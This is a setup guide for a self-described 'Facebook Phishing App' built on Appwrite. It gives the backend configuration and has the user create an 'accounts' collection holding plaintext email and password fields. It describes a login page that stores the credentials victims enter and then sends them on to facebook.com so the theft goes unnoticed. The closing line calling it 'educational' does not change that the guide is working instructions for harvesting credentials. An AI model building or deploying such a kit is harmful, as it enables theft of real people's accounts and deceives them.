# Facebook Phishing App Setup Guide

## Appwrite Configuration

To get the Appwrite integration working, you need to configure your Appwrite credentials in the `src/config.js` file.

### Step 1: Configuration is Complete!

Your Appwrite credentials have been pre-configured:

```javascript
export const appwriteConfig = {
  endpoint: 'https://cloud.appwrite.io/v1',
  project: '69b2a05d000ff1fe0013', // Your project ID
  database: '69b2a105003247b3a7e6', // Your database ID
  collections: {
    accounts: 'accounts' // Your collection ID
  }
};
```

### Step 2: Create Database and Collection in Appwrite

1. **Create a Database:**
   - Go to your Appwrite console
   - Navigate to Databases
   - Create a new database with ID: `69b2a105003247b3a7e6`
   - This should match the database ID in the config

2. **Create Collection:**
   - Create a collection named `accounts`
   - This should match the collection ID in the config

3. **Add Collection Attributes:**
   For the `accounts` collection, add these attributes:
   - `email` (string)
   - `password` (string)

### Step 3: Set Collection Permissions

Make sure your collections have the appropriate permissions to allow document creation from your frontend application.

## Features

### Login Flow
1. User enters email and password
2. Credentials are saved to Appwrite database
3. User is redirected to facebook.com

### Signup Flow
1. User fills out registration form
2. Signup data is saved to Appwrite database
3. User is redirected to login page

### Data Collected
- **Both Login and Signup:** email, password only

## Running the Application

1. Install dependencies:
   ```bash
   npm install
   ```

2. Start the development server:
   ```bash
   npm start
   ```

3. Open http://localhost:3005 in your browser

## Important Notes

- This is a demonstration application for educational purposes
- Make sure to configure proper security settings in your Appwrite project
- Consider implementing additional security measures for production use